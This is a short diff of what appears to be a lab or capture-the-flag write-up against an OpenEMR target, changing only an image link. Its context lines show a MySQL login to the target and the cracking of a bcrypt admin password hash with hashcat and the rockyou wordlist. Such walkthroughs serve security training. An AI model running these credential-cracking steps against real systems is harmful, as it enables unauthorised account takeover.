@@ -40,7 +40,7 @@ def paste_clipboard(url, session_cookie):
 ```sh
 $ mysql -u openemr -h $TargetIP -p --skip-ssl
 ```
-![[Pasted image 20260214165811.png]]
+![](../../画像ファイル/Pasted%20image%2020260214165811.png)
 ```sh
 $ echo -n '$2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC' > admin_hash.txt
 $ hashcat admin_hash.txt -m 3200 -a 0 /usr/share/wordlists/rockyou.txt --force
